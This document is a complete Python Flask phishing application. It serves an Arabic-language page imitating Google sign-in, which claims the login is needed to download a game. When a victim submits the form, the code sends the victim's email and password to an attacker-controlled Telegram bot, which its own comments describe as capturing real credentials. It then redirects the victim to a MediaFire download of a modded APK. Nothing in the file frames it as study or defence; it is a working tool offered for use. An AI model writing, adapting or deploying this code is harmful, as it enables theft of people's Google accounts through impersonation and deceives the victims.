import os
import requests
from flask import Flask, redirect, render_template_string, request

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "hohosbid_super_secret_key")

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

MEDIAFIRE_URL = (
    "https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod"
    "__40_Updated__41_.apk/file"
)


@app.route("/", methods=["GET", "POST"])
def home():
  if request.method == "POST":
    email = request.form.get("email")
    password = request.form.get("password")

    # إرسال البريد وكلمة السر الحقيقية التي كتبها المستخدم إلى بوت تيليجرام
    if BOT_TOKEN and CHAT_ID:
      msg = (
          "🚨 تم التقاط بيانات دخول جديدة!\n\n📧 البريد الإلكتروني:"
          f" {email}\n🔑 كلمة السر: {password}"
      )
      telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
      requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})

    # التوجيه المباشر لرابط التحميل على ميديافاير
    return redirect(MEDIAFIRE_URL)

  return render_template_string("""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول بحساب Google</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
        body { background: #f0f4f8; display: flex; justify-content: center; align-items: center; min-height: 100vh; width: 100vw; padding: 20px; }
        .login-card { background: #fff; width: 100%; max-width: 400px; padding: 40px 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); border: 1px solid #dadce0; text-align: center; }
        .google-logo { font-size: 24px; font-weight: bold; color: #4285F4; margin-bottom: 10px; }
        h2 { color: #202124; font-size: 22px; margin-bottom: 8px; font-weight: 500; }
        p { color: #5f6368; font-size: 14px; margin-bottom: 24px; }
        .input-group { margin-bottom: 15px; text-align: right; }
        .input-group input { width: 100%; padding: 14px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 15px; outline: none; transition: border 0.3s; }
        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 13px 14px; }
        .submit-btn { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 15px; }
        .submit-btn:hover { background: #1557b0; }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="google-logo">Google</div>
        <h2>تسجيل الدخول</h2>
        <p>استخدم حساب Google الخاص بك للتابعة وتحميل اللعبة</p>
        <form method="POST">
            <div class="input-group">
                <input type="text" name="email" required placeholder="البريد الإلكتروني أو الهاتف">
            </div>
            <div class="input-group">
                <input type="password" name="password" required placeholder="أدخل كلمة المرور">
            </div>
            <button type="submit" class="submit-btn">التالي</button>
        </form>
    </div>
</body>
</html>
""")


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
